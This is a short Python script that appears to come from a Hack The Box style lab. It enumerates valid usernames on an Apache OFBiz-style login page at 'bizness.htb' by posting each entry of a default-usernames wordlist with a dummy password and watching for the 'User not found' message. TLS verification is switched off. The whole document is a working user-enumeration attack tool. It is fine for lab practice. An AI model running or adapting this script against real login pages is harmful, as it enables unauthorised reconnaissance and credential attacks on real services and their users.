import requests
from urllib3.exceptions import InsecureRequestWarning


url = "https://bizness.htb/catalog/control/login"

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
}
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

with open("/usr/share/wordlists/Usernames/cirt-default-usernames.txt") as file:
    for line in file:
        line = line.replace("\n", "")
        print(line)
        data = {
            "USERNAME": line,
            "PASSWORD": "teset",
            "JavaScriptEnabled": "Y",

        }

        response = requests.request(
            "POST",
            url,
            headers=headers,
            data=data,
            verify=False
        )


        text = str(response.text)
        if("User not found" not in text):
            print("Found " + line )
            exit()